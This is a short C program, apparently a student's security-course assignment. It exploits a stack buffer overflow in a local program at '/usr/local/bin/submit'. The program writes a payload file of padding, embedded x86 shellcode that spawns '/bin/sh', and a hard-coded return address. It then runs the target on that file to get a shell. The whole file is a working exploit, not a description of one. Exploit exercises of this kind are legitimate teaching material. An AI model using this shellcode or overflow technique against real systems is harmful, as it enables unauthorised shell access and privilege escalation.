//Patrick Wong
//20317267

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit"

int main(void)
{  
	int i;
	char *args[4];
	char *env[1];	
    char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
	FILE *fp;

	fp = fopen("file.txt", "w");
	fputc('\0', fp);
	//1032: buffer + sfp + ret, 1024: buffer
	//1: null character
	//8: sfp + ret
	for (i = 0; i < 1032-strlen(shellcode)-1-8; i++) {
		fputc('A', fp);
	}
	fputs(shellcode,fp);
	for (i = 0; i < 4;i++)
		fputc('A',fp);
	fputc('\x0b', fp);
	fputc('\xde', fp);
	fputc('\xbf', fp);
	fputc('\xff', fp);
	fputc('\0', fp);
	fclose(fp);

	args[0] = TARGET; args[1] = "file.txt"; 
	args[2] = "message"; args[3] = NULL;
	
	env[0] = NULL;
	
	if (execve(TARGET, args, env) < 0)
		fprintf(stderr, "execve failed.\n");
	exit(0);
}
